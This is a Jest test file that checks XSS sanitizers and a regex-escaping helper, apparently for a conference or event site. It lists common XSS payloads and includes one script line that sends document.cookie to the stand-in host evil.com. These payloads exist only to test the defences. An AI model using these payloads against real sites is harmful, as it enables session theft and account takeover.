import { sanitizeXSS, sanitizeJsonLdValue, serializeSafeJsonLd } from '@/lib/validation';

/**
 * Escape special regex characters to prevent ReDoS attacks
 */
function escapeRegExp(string: string): string {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

describe('XSS Prevention Tests', () => {
  describe('sanitizeXSS', () => {
    it('should escape HTML tags', () => {
      const input = '<script>alert("XSS")</script>';
      const output = sanitizeXSS(input);

      expect(output).toContain('&lt;script&gt;');
      expect(output).not.toContain('<script>');
    });

    it('should escape quotes', () => {
      const input = 'value="test"';
      const output = sanitizeXSS(input);

      expect(output).toContain('&quot;');
    });

    it('should handle empty strings', () => {
      expect(sanitizeXSS('')).toBe('');
      expect(sanitizeXSS(undefined as unknown as string)).toBe('');
    });

    it('should escape forward slashes', () => {
      const input = '</script>';
      const output = sanitizeXSS(input);

      expect(output).toContain('&#x2F;');
    });
  });

  describe('escapeRegExp', () => {
    it('should escape regex special characters', () => {
      const input = '.*+?^${}()|[]\\';
      const output = escapeRegExp(input);

      expect(output).toBe('\\.\\*\\+\\?\\^\\$\\{\\}\\(\\)\\|\\[\\]\\\\');
    });

    it('should handle normal strings', () => {
      const input = 'conference';
      const output = escapeRegExp(input);

      expect(output).toBe('conference');
    });
  });

  describe('sanitizeJsonLdValue', () => {
    it('should remove script tags from strings', () => {
      const input = '<script>alert("XSS")</script>Conference';
      const output = sanitizeJsonLdValue(input);

      expect(output).toBe('Conference');
      expect(output).not.toContain('<script>');
    });

    it('should remove event handlers from strings', () => {
      const input = '<img src=x onerror=alert("XSS")>';
      const output = sanitizeJsonLdValue(input);

      expect(output).not.toMatch(/\bonerror\b/i);
    });

    it('should handle nested objects', () => {
      const input = {
        name: '<script>alert("XSS")</script>',
        location: {
          name: '<img onload=alert("XSS")>'
        }
      };
      const output = sanitizeJsonLdValue(input) as Record<string, unknown>;

      expect(output.name).toBe('');
      expect((output.location as Record<string, unknown>).name).toBe('<img>');
    });

    it('should handle arrays', () => {
      const input = [
        { name: '<script>alert(1)</script>' },
        { name: '<script>alert(2)</script>' }
      ];
      const output = sanitizeJsonLdValue(input) as Array<Record<string, unknown>>;

      expect(output[0].name).toBe('');
      expect(output[1].name).toBe('');
    });

    it('should preserve non-string values', () => {
      const input = {
        count: 42,
        active: true,
        nullValue: null,
        undefinedValue: undefined
      };
      const output = sanitizeJsonLdValue(input) as Record<string, unknown>;

      expect(output.count).toBe(42);
      expect(output.active).toBe(true);
      expect(output.nullValue).toBe(null);
      expect(output.undefinedValue).toBe(undefined);
    });
  });

  describe('serializeSafeJsonLd', () => {
    it('should escape </script> tags in JSON output', () => {
      const data = {
        name: '</script><script>alert("XSS")</script><script>'
      };
      const output = serializeSafeJsonLd(data);

      expect(output).not.toContain('</script>');
      expect(output).toContain('\\u003c/script\\u003e');
    });

    it('should escape < and > characters', () => {
      const data = {
        description: '<div>Content</div>'
      };
      const output = serializeSafeJsonLd(data);

      expect(output).toContain('\\u003cdiv\\u003e');
      expect(output).toContain('\\u003c/div\\u003e');
    });

    it('should produce valid JSON after escaping', () => {
      const data = {
        '@context': 'https://schema.org',
        '@type': 'Event',
        name: 'Tech Conference</script><script>alert("XSS")</script>'
      };
      const output = serializeSafeJsonLd(data);

      // Should be able to parse it back
      const parsed = JSON.parse(output);
      expect(parsed['@context']).toBe('https://schema.org');
      // Script tags should be sanitized
      expect(parsed.name).not.toContain('<script>');
    });

    it('should handle special characters in URLs', () => {
      const data = {
        url: 'https://example.com/?param=<value>&other=test'
      };
      const output = serializeSafeJsonLd(data);

      expect(output).toContain('\\u003cvalue\\u003e');
    });
  });

  describe('Common XSS Payloads', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      'javascript:alert("XSS")',
      'onmouseover=alert("XSS")',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
      '<marquee onstart=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<select onfocus=alert("XSS") autofocus>',
      '<video src=x onerror=alert("XSS")>',
      '<audio src=x onerror=alert("XSS")>',
    ];

    xssPayloads.forEach((payload) => {
      it(`should neutralize payload: ${payload.substring(0, 30)}...`, () => {
        const sanitized = sanitizeJsonLdValue(payload) as string;

        // Should not contain unescaped event handlers (catch both bare and whitespace-prefixed)
        // Anchor on \b or start/whitespace to ensure we catch 'onclick=' as well as ' onclick='
        expect(sanitized).not.toMatch(/(?:^|\s|\b)on\w+\s*=/i);
        // Should not contain script tags
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('</script');
      });
    });
  });

  describe('ReDoS Prevention', () => {
    it('should escape regex special characters to prevent ReDoS', () => {
      const maliciousPattern = '(a+)+b';
      const escaped = escapeRegExp(maliciousPattern);

      // When used in a regex, this should not cause catastrophic backtracking
      const testString = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
      const startTime = Date.now();

      // This regex should not hang
      const regex = new RegExp(`(${escaped})`, 'gi');
      testString.replace(regex, '<mark>$1</mark>');

      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(100);
    });

    it('should handle long input strings efficiently', () => {
      const searchTerm = 'conference';
      const longText = 'conference '.repeat(1000);

      const escaped = escapeRegExp(searchTerm);
      const startTime = Date.now();

      const regex = new RegExp(`(${escaped})`, 'gi');
      longText.replace(regex, '<mark>$1</mark>');

      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(100);
    });
  });

  describe('Defense in Depth', () => {
    it('should combine multiple sanitization layers', () => {
      // Simulating what happens when a user searches with a malicious term
      const maliciousSearch = '<script>fetch("https://evil.com?c="+document.cookie)</script>';

      // Layer 1: sanitizeXSS for display contexts
      const sanitized = sanitizeXSS(maliciousSearch);
      expect(sanitized).not.toContain('<script>');

      // Layer 2: escapeRegExp for regex operations
      const escaped = escapeRegExp(maliciousSearch);
      expect(() => new RegExp(escaped)).not.toThrow();

      // Layer 3: sanitizeJsonLdValue for JSON contexts
      const jsonSafe = sanitizeJsonLdValue(maliciousSearch);
      expect(jsonSafe).not.toContain('<script>');
    });

    it('should handle double-encoded attacks', () => {
      const doubleEncoded = '&lt;script&gt;alert("XSS")&lt;/script&gt;';

      // Double-encoded entities are already safe (they display as text, not HTML)
      // The sanitizeXSS function should still escape the & character to prevent
      // the entity from being decoded back to dangerous HTML
      const sanitized = sanitizeXSS(doubleEncoded);

      // Should contain escaped entities (the & becomes &amp;)
      expect(sanitized).toContain('&amp;lt;');
      expect(sanitized).toContain('&amp;gt;');
    });

    it('should handle null byte injection attempts', () => {
      const nullBytePayload = '<scr\x00ipt>alert("XSS")</scr\x00ipt>';

      const sanitized = sanitizeXSS(nullBytePayload) as string;
      expect(sanitized).not.toContain('\x00');
      expect(sanitized).toContain('script'); // Should be 'script' after null byte removal
    });
  });
});
